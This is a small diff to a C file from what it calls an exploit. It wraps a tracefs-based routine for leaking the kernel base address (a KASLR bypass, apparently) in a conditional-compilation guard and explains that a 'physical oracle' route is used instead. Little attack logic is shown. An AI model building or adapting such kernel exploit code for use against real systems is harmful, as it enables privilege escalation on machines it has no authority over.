@@ -1,5 +1,16 @@
 #include "common.h"
 
+/*
+ * This file implements the primary tracefs slide route when
+ * APP_PHYS_P0_ORACLE=0.
+ *
+ * When APP_PHYS_P0_ORACLE=1 (current target.h), slide_app.c already
+ * embeds the tracefs path and the rest of the exploit uses the physical
+ * oracle. Compiling this file in that configuration would conflict on
+ * slide_leak_kernel_base, so the whole translation unit is empty.
+ */
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
+
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 #ifndef SLIDE_TRACEFS_EVENT_ID
 #define SLIDE_TRACEFS_EVENT_ID 109
@@ -157,3 +168,5 @@ int slide_leak_kernel_base(void) {
   }
   return slide_tracefs_leak_kernel_base();
 }
+
+#endif /* !APP_PHYS_P0_ORACLE */
